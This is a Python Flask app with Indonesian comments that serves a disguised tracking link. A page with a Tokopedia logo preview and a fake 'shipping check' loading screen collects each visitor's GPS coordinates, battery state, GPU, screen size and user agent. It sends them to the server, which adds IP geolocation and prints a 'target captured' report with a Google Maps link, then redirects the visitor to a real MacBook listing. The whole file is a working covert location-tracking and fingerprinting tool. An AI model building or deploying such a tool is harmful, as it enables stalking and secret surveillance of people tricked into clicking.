from flask import Flask, request, render_template_string, jsonify
import requests
import re

# Vercel mencari variable bernama 'app' ini secara otomatis
app = Flask(__name__)

# --- CONFIG GAMBAR & LINK ---
IMAGE_URL = "https://upload.wikimedia.org/wikipedia/commons/9/9a/Logo-Tokopedia.png"
TARGET_URL = "https://www.tokopedia.com/studioponsel/apple-macbook-air-m4-2025-13-inch-24-512gb-16-512gb-10-core-gpu-16-256gb-8-core-gpu-1730970954041230655?extParam=ivf%3Dfalse%26keyword%3Dmacbook+m4%26search_id%3D20251213173041C5FF2543B53F4C1C1ASB%26src%3Dsearch&t_id=1765647049167&t_st=1&t_pp=search_result&t_efo=search_pure_goods_card&t_ef=goods_search&t_sm=&t_spt=search_result"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cek Ongkir Otomatis</title>
    <meta property="og:image" content="{{ image }}">
    <meta name="twitter:card" content="summary_large_image">
    <style>
        body { font-family: sans-serif; text-align: center; padding: 20px; background-color: #f8f8f8; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #ee4d2d; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { color: #666; font-size: 14px; }
    </style>
</head>
<body>
    <h3>Memproses Data...</h3>
    <div class="loader"></div>
    <p>Mohon tunggu sebentar...</p>

    <script>
        const targetUrl = "{{ target }}";

        // 1. Ambil Info Perangkat (Layar, GPU, User Agent)
        function getBasicInfo() {
            let info = {
                userAgent: navigator.userAgent,
                screen: screen.width + "x" + screen.height,
                gpu: "Unknown"
            };
            try {
                let canvas = document.createElement('canvas');
                let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        info.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                }
            } catch(e) {}
            return info;
        }

        // 2. Ambil Info Baterai (Async)
        async function getBatteryStatus() {
            let batteryInfo = { level: "Unknown", charging: "Unknown" };
            
            // Cek apakah browser mendukung API Baterai (Chrome/Android support, iPhone tidak)
            if (navigator.getBattery) {
                try {
                    const bat = await navigator.getBattery();
                    batteryInfo.level = Math.round(bat.level * 100) + "%";
                    batteryInfo.charging = bat.charging ? "Ya (Sedang Dicas)" : "Tidak (Baterai Hp)";
                } catch (e) {
                    console.log("Gagal baca baterai");
                }
            } else {
                batteryInfo.level = "Not Supported (Mungkin iPhone)";
            }
            return batteryInfo;
        }

        // 3. Fungsi Kirim Data Utama
        async function sendData(gpsData = null) {
            let deviceData = getBasicInfo();
            let batteryData = await getBatteryStatus(); // Tunggu data baterai

            let payload = {
                device: deviceData,
                battery: batteryData,
                gps: gpsData
            };

            fetch('/log_data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).then(() => {
                window.location.href = targetUrl;
            }).catch(() => {
                window.location.href = targetUrl;
            });
        }

        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        sendData({ lat: pos.coords.latitude, long: pos.coords.longitude, acc: pos.coords.accuracy });
                    },
                    (err) => {
                        sendData(null); // User tolak GPS
                    },
                    { enableHighAccuracy: true, timeout: 4000 }
                );
            } else {
                sendData(null);
            }
        };
    </script>
</body>
</html>
"""

def parse_device_name(ua_string):
    if "iPhone" in ua_string: return "Apple iPhone"
    if "Android" in ua_string:
        match = re.search(r";\s?([^;]+?)\s?Build/", ua_string)
        if match: return f"Android - Model: {match.group(1).strip()}"
    if "Windows" in ua_string: return "PC / Laptop (Windows)"
    return "Perangkat Tidak Dikenal"

def get_ip_info(ip_address):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip_address}?fields=status,city,regionName,isp,mobile")
        return response.json() if response.status_code == 200 else None
    except: return None

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def home(path):
    return render_template_string(HTML_TEMPLATE, image=IMAGE_URL, target=TARGET_URL)

@app.route('/log_data', methods=['POST'])
def log_data():
    data = request.json
    device = data.get('device', {})
    battery = data.get('battery', {}) # Ambil data baterai
    gps = data.get('gps')
    
    user_ip = request.headers.get('x-forwarded-for', request.remote_addr)
    geo_ip = get_ip_info(user_ip)
    readable_name = parse_device_name(device.get('userAgent', ''))

    print("\n" + "="*40)
    print(f"🔥 TARGET TERTANGKAP! (IP: {user_ip})")
    print("="*40)
    
    print(f"[📱 DEVICE INFO]")
    print(f"• HP / Model : {readable_name}")
    print(f"• Baterai    : {battery.get('level')}")   # <--- FITUR BARU
    print(f"• Charging?  : {battery.get('charging')}")# <--- FITUR BARU
    print(f"• GPU        : {device.get('gpu')}")
    
    if gps:
        print(f"\n[📍 GPS AKURAT]")
        print(f"• Maps : https://www.google.com/maps/search/?api=1&query={gps['lat']},{gps['long']}")
        print(f"• Akurasi : {gps['acc']}m")
    elif geo_ip:
        print(f"\n[📍 LOKASI IP]")
        print(f"• Lokasi : {geo_ip.get('city')}, {geo_ip.get('regionName')}")
        print(f"• ISP    : {geo_ip.get('isp')}")

    print("="*40 + "\n")
    return jsonify({"status": "captured"})